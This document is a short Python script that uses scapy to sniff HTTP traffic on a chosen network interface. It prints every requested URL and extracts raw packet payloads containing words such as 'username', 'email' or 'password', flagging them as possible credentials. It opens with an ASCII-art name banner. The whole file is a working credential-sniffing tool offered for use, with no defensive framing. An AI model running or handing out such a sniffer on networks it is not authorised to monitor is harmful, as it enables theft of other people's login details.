#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
logo = '''

 /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$                               /$$       /$$ /$$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$                              | $$      |__/| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$$| $$$$$$$  /$$| $$
| $$$$$$$$| $$$$$$$$| $$$$$$$$| $$$$$$$$ |____  $$ /$$__  $$ /$$_____/| $$__  $$| $$| $$
| $$__  $$| $$__  $$| $$__  $$| $$__  $$  /$$$$$$$| $$  \__/|  $$$$$$ | $$  \ $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$| $$       \____  $$| $$  | $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$$| $$       /$$$$$$$/| $$  | $$| $$| $$
|__/  |__/|__/  |__/|__/  |__/|__/  |__/ \_______/|__/      |_______/ |__/  |__/|__/|__/

'''
print(logo)

target_interface = input("Please enter the interface you would like to scan: ")

def sniff(interface):
    print("[+] Starting sniffer on the interface " + target_interface + ".")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "login", "email", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
                    


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password >> " + str(login_info) + "\n\n")
        
sniff(target_interface)